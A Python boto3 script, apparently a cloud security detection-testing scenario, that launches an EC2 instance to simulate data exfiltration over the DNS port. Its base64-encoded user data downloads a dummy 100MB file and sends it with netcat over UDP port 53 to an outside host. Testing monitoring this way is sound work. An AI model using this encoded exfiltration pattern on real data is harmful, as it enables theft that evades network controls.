import boto3
import time
from botocore.exceptions import ClientError
import sys

def main():
#check if any arguments given
    if len(sys.argv) < 3:
        print("Must supply AWS Key and Secret as arguments,,, exiting")
        exit()

    AWS_ACCESS_KEY = sys.argv[1]
    AWS_SECRET_KEY = sys.argv[2]
    NUMBER_OF_INSTANCES = 1

    print("Running Scenario 4: data exfil via DNS port")
    print("====================================================================")

    data_exfil(AWS_ACCESS_KEY, AWS_SECRET_KEY, NUMBER_OF_INSTANCES)

    print("Running Scenario 4: Completed")
    print("====================================================================")

def data_exfil(AWS_ACCESS_KEY, AWS_SECRET_KEY, NUMBER_OF_INSTANCES):

    ec2 = boto3.resource('ec2', aws_access_key_id = AWS_ACCESS_KEY, aws_secret_access_key = AWS_SECRET_KEY)

    print("Creating the instance to tunnel out *** make sure adns.yukozuna.com is live!!!")
    try:
        instance = ec2.create_instances(
                        ImageId='ami-0e17ad9abf7e5c818',
                        InstanceType='t2.micro',
                        MaxCount=NUMBER_OF_INSTANCES,
                        MinCount=NUMBER_OF_INSTANCES,
                        UserData='IyEvYmluL2Jhc2ggCnNldCAteApleGVjID4gPih0ZWUgL3Zhci9sb2cvdXNlci1kYXRhLmxvZ3xsb2dnZXIgLXQgdXNlci1kYXRhIC1zIDI+L2Rldi9jb25zb2xlKSAyPiYxCmVjaG8gQkVHSU4KZGF0ZSAnKyVZLSVtLSVkICVIOiVNOiVTJwplY2hvICJVc2VyLURhdGEgU2NyaXB0IFN0YXJ0aW5nIgp5dW0gdXBkYXRlIC15Cnl1bSBpbnN0YWxsIC15IG5tYXAKZWNobyAiRG93bmxvYWRpbmcgMTAwTUIgRmlsZSIKY3VybCBodHRwOi8vdGVzdGZpbGVzLmhvc3RuZXR3b3Jrcy5jb20uYXUvMTAwTUIuaXNvIC1vIDEwME1CLmlzbwplY2hvICJTZW5kaW5nIDEwME1CIEZpbGUiCm5jIC12IGFkbnMueXVrb3p1bmEuY29tIC11IDUzIDwxMDBNQi5pc28KZWNobyAiU2xlZXBpbmcgZm9yIDEwIgplY2hvICJTZW5kaW5nIDEwME1CIEZpbGUgYWdhaW4iCm5jIC12IGFkbnMueXVrb3p1bmEuY29tIC11IDUzIDwxMDBNQi5pc28Kc2h1dGRvd24gbm93',
                        )
        print(instance)
    except:
        raise Exception("Couldn't create instance")

    print("Instance created, will wait until it runs then stops")

    for i in instance:
        while i.state['Name'] != 'stopped':
           print('Instance is %s' % i.state['Name'])
           time.sleep(10)
           i.reload()
        try:
            print("Terminating Instance")
            response = i.terminate()
            print("Instance Terminated")
        except:
            print("There was an error terminating the instance. You may need to terminate it manually")

if __name__ == "__main__":
    main()
